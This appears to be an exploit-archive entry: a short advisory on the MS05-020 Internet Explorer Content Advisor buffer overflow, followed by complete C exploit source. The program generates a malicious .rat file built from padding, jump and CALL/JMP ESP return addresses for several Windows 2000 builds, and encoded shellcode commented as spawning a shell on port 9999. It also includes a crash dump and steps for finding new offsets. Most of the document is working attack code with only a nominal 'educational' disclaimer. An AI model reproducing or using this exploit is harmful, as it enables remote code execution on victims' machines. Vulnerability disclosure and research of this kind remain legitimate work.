source: http://www.securityfocus.com/bid/13117/info

Microsoft Internet Explorer is prone to a remote buffer overflow vulnerability when handling malformed Content Advisor files. An attacker can exploit this issue by crafting a Content Advisor file with excessive data and arbitrary machine code to be processed by the browser.

A typical attack would involve the attacker creating a Web site that includes the malicious file. A similar attack can also be carried out through HTML email using Microsoft Outlook and Microsoft Outlook Express applications.

It should be noted that successful exploitation requires the user to follow various steps to install a malicious file. 

/*
* Ms05-020 Content Advisor Memory Corruption Vulnerability POC
*
*
* Exploit by : Miguel Tarasc� Acu�a - Haxorcitos.com 2004/2005
* Tarako AT gmail.com 
*
* Credits:
* Andres Tarasc� (atarasco _at_ sia.es) has discovered this vulnerability
*
* Platforms afected/tested:
*
* - Windows 2000 SP2 Spanish
* - Windows 2000 SP3 Spanish
* - Windows 2000 SP4 Spanish
* - Probably All Windows 2000 versions
*
*
* Original Advisory: http://www.microsoft.com/technet/security/bulletin/MS05-020.mspx
* Exploit Date: 22/11/2004
*
* Disclosure Timeline:
* November 15 2004 - Discovered
* November 22 2004 - Exploit was developed
* November 29 2004 - Initial Vendor Notification
* November 29 2004 - Initial Vendor Notification
* December 15 2004 - Coordinated disclosure
* April 12 2005 - MS05-020 Released
*
*
* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
*
* Greetings to: #haxorcitos, #dsr and #localhost @efnet
*
*
* rsaci.rat POC example file:
*
* ((PICS-version 1.0)
* (rating-system "http://www.haxorcitos.com/")
* (rating-service "http://www.haxorcitos.com/index.html")
* (name "AAAAA...300...AAAAA")
* (description "msrating.dll,ClickedOnRAT() - Asesor de Contenido Bof ")
*
* after double click, msrating.dll,ClickedOnRAT() is executed. CPU registers
*
* 0:001> g
* (330.6b0): Access violation - code c0000005 (first chance)
* First chance exceptions are reported before any exception handling.
* This exception may be expected and handled.
* eax=00000000 ebx=0006f638 ecx=00010101 edx=ffffffff esi=77e1588a edi=0006f360
* eip=41414141 esp=0006f360 ebp=41414141 iopl=0 nv up ei pl zr na po nc
* cs=001b ss=0023 ds=0023 es=0023 fs=0038 gs=0000 efl=00010246
* 41414141 ?? ???
*
* How to get new offsets for Windows 2000:
* 1) execute generated .rat file
* 2) search for FFD4 (CALL ESP) in the memory address (for example wininet.dll)
* 3) Place your new offset into the exploit
*
*/

#include <stdio.h>
#include <windows.h>

#pragma pack(1)

#define RATFILE "rsaci.rat"

unsigned char shellcode[] = { // spawn a Shell on port 9999
"\xEB\x03\x5D\xEB\x05\xE8\xF8\xFF\xFF\xFF\x8B\xC5\x83\xC0\x11\x33"
"\xC9\x66\xB9\xC9\x01\x80\x30\x88\x40\xE2\xFA\xDD\x03\x64\x03\x7C"
"\x09\x64\x08\x88\x88\x88\x60\xC4\x89\x88\x88\x01\xCE\x74\x77\xFE"
"\x74\xE0\x06\xC6\x86\x64\x60\xD9\x89\x88\x88\x01\xCE\x4E\xE0\xBB"
"\xBA\x88\x88\xE0\xFF\xFB\xBA\xD7\xDC\x77\xDE\x4E\x01\xCE\x70\x77"
"\xFE\x74\xE0\x25\x51\x8D\x46\x60\xB8\x89\x88\x88\x01\xCE\x5A\x77"
"\xFE\x74\xE0\xFA\x76\x3B\x9E\x60\xA8\x89\x88\x88\x01\xCE\x46\x77"
"\xFE\x74\xE0\x67\x46\x68\xE8\x60\x98\x89\x88\x88\x01\xCE\x42\x77"
"\xFE\x70\xE0\x43\x65\x74\xB3\x60\x88\x89\x88\x88\x01\xCE\x7C\x77"
"\xFE\x70\xE0\x51\x81\x7D\x25\x60\x78\x88\x88\x88\x01\xCE\x78\x77"
"\xFE\x70\xE0\x2C\x92\xF8\x4F\x60\x68\x88\x88\x88\x01\xCE\x64\x77"
"\xFE\x70\xE0\x2C\x25\xA6\x61\x60\x58\x88\x88\x88\x01\xCE\x60\x77"
"\xFE\x70\xE0\x6D\xC1\x0E\xC1\x60\x48\x88\x88\x88\x01\xCE\x6A\x77"
"\xFE\x70\xE0\x6F\xF1\x4E\xF1\x60\x38\x88\x88\x88\x01\xCE\x5E\xBB"
"\x77\x09\x64\x7C\x89\x88\x88\xDC\xE0\x89\x89\x88\x88\x77\xDE\x7C"
"\xD8\xD8\xD8\xD8\xC8\xD8\xC8\xD8\x77\xDE\x78\x03\x50\xDF\xDF\xE0"
"\x8A\x88\xAF\x87\x03\x44\xE2\x9E\xD9\xDB\x77\xDE\x64\xDF\xDB\x77"
"\xDE\x60\xBB\x77\xDF\xD9\xDB\x77\xDE\x6A\x03\x58\x01\xCE\x36\xE0"
"\xEB\xE5\xEC\x88\x01\xEE\x4A\x0B\x4C\x24\x05\xB4\xAC\xBB\x48\xBB"
"\x41\x08\x49\x9D\x23\x6A\x75\x4E\xCC\xAC\x98\xCC\x76\xCC\xAC\xB5"
"\x01\xDC\xAC\xC0\x01\xDC\xAC\xC4\x01\xDC\xAC\xD8\x05\xCC\xAC\x98"
"\xDC\xD8\xD9\xD9\xD9\xC9\xD9\xC1\xD9\xD9\x77\xFE\x4A\xD9\x77\xDE"
"\x46\x03\x44\xE2\x77\x77\xB9\x77\xDE\x5A\x03\x40\x77\xFE\x36\x77"
"\xDE\x5E\x63\x16\x77\xDE\x9C\xDE\xEC\x29\xB8\x88\x88\x88\x03\xC8"
"\x84\x03\xF8\x94\x25\x03\xC8\x80\xD6\x4A\x8C\x88\xDB\xDD\xDE\xDF"
"\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D\xF0\x8B\x5D\x03\xC2\x90"
"\x03\xD2\xA8\x8B\x55\x6B\xBA\xC1\x03\xBC\x03\x8B\x7D\xBB\x77\x74"
"\xBB\x48\x24\xB2\x4C\xFC\x8F\x49\x47\x85\x8B\x70\x63\x7A\xB3\xF4"
"\xAC\x9C\xFD\x69\x03\xD2\xAC\x8B\x55\xEE\x03\x84\xC3\x03\xD2\x94"
"\x8B\x55\x03\x8C\x03\x8B\x4D\x63\x8A\xBB\x48\x03\x5D\xD7\xD6\xD5"
"\xD3\x4A\x8C\x88"
};


unsigned char RHeader[]="((PICS-version 1.0)\n"
"(rating-system \"http://www.haxorcitos.com\")\n"
"(rating-service \"http://www.haxorcitos.com/index.html\")\n"
"(name \"";
unsigned char RTail[]= "\")\n"
"(description \" Ms05-020 Content Advisor Memory Corruption Vulnerability\"))\n"
"(description \" http://www.microsoft.com/technet/security/bulletin/MS05-020.mspx\"))\n"
"(description \" Exploit by Miguel Tarasc� Acu�a - Tarako [AT] gmail[dot]com\"))\n";

char jmpbelow[]= "\x90\xeb\xFF\x90";

struct { char *name; long offset; } supported[] = { 
{" Windows 2000 Pro SP2 Spanish" , 0x772153D3}, // FFD4 CALL ESP - wininet.dll 6.0.2900.2577
/*C:\>Findjmp.exe wininet.dll ESP
0x77181783 push ESP - ret
0x771A31CB push ESP - ret
0x771ABFB9 jmp ESP
0x771AF5FE jmp ESP
0x771B2FAD jmp ESP
0x771B470E jmp ESP
0x771C8382 jmp ESP
0x771CC694 jmp ESP
0x771CE3C7 jmp ESP
0x771CFA0B jmp ESP
0x771F5D7B jmp ESP
0x771FE9D9 jmp ESP
0x77212C74 jmp ESP
0x7721448D jmp ESP
0x772153D3 call ESP
0x772155AB jmp ESP
0x77215723 jmp ESP
0x77215788 jmp ESP
0x77216161 jmp ESP
0x77216221 jmp ESP
0x772170AF jmp ESP
0x7721745F jmp ESP
0x772174DB call ESP
0x77217717 call ESP
0x77217F70 call ESP
0x77218137 call ESP
0x7721813F jmp ESP
*/
{" Windows 2000 Pro SP3 Spanish" , 0x76BE5983}, // FFD4 CALL ESP - wininet.dll 5.0.3502.4619 
/*C:\>Findjmp.exe wininet.dll ESP
0x76BE5983 call ESP
0x76BE8AAC push ESP - ret*/
{" Windows 2000 Pro SP4 Spanish" , 0x702853D3}, // FFD4 CALL ESP - wininet.dll 6.0.2800.1106
/*C:\>Findjmp.exe wininet.dll ESP
0x70219C3A push ESP - ret
0x70282C74 jmp ESP
0x70282D3D jmp ESP
0x70283B1C jmp ESP
0x70283BE5 jmp ESP
0x702843C4 jmp ESP
0x7028448D jmp ESP
0x702853D3 call ESP
0x702855AB jmp ESP
0x70285723 jmp ESP
0x70285788 jmp ESP
0x70286161 jmp ESP
0x70286221 jmp ESP
0x702870AF jmp ESP
0x7028745F jmp ESP
0x702874DB call ESP
0x70287717 call ESP
0x70287F70 call ESP
0x70288137 call ESP
0x7028813F jmp ESP*/
{" Windows 2000 Server SP4 Spanish" , 0x76BFBB5B}, // FFE4 JMP ESP - wininet.dll 5.0.3700.6713
/*C:\>Findjmp.exe wininet.dll ESP
0x76BE558B push ESP - ret
0x76BFBB5B jmp ESP
0x76BFC155 push ESP - ret
0x76BFC159 push ESP - ret */
{" Crash", 0x41414141}

},VERSIONES;

/******************************************************************************/
void ShowHeader(int argc) {
int i;
printf(" Ms05-020 Content Advisor Memory Corruption Vulnerability\n");
printf(" Exploit by Miguel Tarasco - Tarako [at] gmail [dot] com\n\n");

printf(" Windows Versions:\n");
printf(" ----------------------------------------\n");
for (i=0;i<sizeof(supported)/sizeof(VERSIONES);i++) {
printf(" %d) %s (0x%08x)\n",i,supported[i].name,supported[i].offset);
}
printf(" ----------------------------------------\n\n");
if (argc<2) { 
printf(" Usage: ratBof.exe <Windows Version>\n");
exit(1);
}
}
/******************************************************************************/


int main(int argc, char* argv[]) {
char buf[1500];
FILE *ratFile=fopen(RATFILE,"w");;
int i;

ShowHeader(argc); 

i=atoi(argv[1]);
printf(" [i] Creating exploit File for platform: %s\n",supported[i].name);

fwrite(RHeader, sizeof(RHeader)-1, 1,ratFile);

memset(buf,0x90,sizeof(buf));
memcpy(buf+280,jmpbelow,strlen(jmpbelow)); // salto 


memcpy(buf+284,&supported[i].offset,sizeof(long)); // offset
memcpy(buf+500,shellcode,sizeof(shellcode)-1);

fwrite(buf,sizeof(buf),1,ratFile);
fwrite(RTail, sizeof(RTail), 1,ratFile);

printf(" [i] rsaci.rat created\n\n");

fclose(ratFile);
return 0;
}
/******************************************************************************/